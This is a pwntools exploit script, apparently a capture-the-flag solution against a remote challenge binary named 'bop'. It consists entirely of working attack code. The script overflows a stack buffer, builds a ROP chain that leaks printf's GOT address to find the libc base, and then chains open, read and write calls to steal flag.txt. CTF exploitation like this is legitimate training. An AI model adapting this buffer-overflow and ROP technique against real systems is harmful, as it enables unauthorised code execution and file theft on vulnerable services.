from pwn import *

context.arch='amd64'
context.log_level='DEBUG'

# p = process('./bop')
p = remote('mc.ax' ,30284)
e = ELF('./bop')
libc = ELF('./libc.so.6')

main = 0x4012F9
pop_rdi = 0x4013d3
pop_rsi_r15 = 0x4013d1

# ropper -f libc.so.6 --nocolor > rop.txt
pop_rdx = 0x142c92 # libc 
syscall_ret = 0x630a9 # libc
pop_rax = 0x36174 # libc

ret = 0x40101a

payload = b''
payload += b'A' * (0x20+0x8)

payload += p64(pop_rdi)
payload += p64(e.got['printf'])
payload += p64(ret)
payload += p64(e.sym['printf'])
payload += p64(ret)
payload += p64(main) # main

# pause()
p.sendlineafter('bop?', payload)

libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['printf']
info('libc base : ' + hex(libc.address))

payload = b''
payload += b'A' * (0x20+0x8)

# read(0, bss, 8) flag.txt
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(0x4040A0) + p64(0)
payload += p64(pop_rdx + libc.address)
payload += p64(11)
payload += p64(ret)
payload += p64(libc.sym['read'])

# open(./flag.txt) syscall
payload += p64(pop_rax + libc.address)
payload += p64(2) # open
payload += p64(pop_rdi)
payload += p64(0x4040A0)
payload += p64(pop_rsi_r15)
payload += p64(0) + p64(0)
payload += p64(ret)
payload += p64(syscall_ret + libc.address)

# read(fd, bss, 100)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi_r15)
payload += p64(0x4040A0) + p64(0)
payload += p64(pop_rdx + libc.address)
payload += p64(100)
payload += p64(ret)
payload += p64(libc.sym['read'])

# write(1, bss, 100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(0x4040A0) + p64(0)
payload += p64(pop_rdx + libc.address)
payload += p64(100)
payload += p64(ret)
payload += p64(libc.sym['write'])

pause()
p.sendlineafter('bop?', payload)
p.send('./flag.txt\x00')

p.interactive()
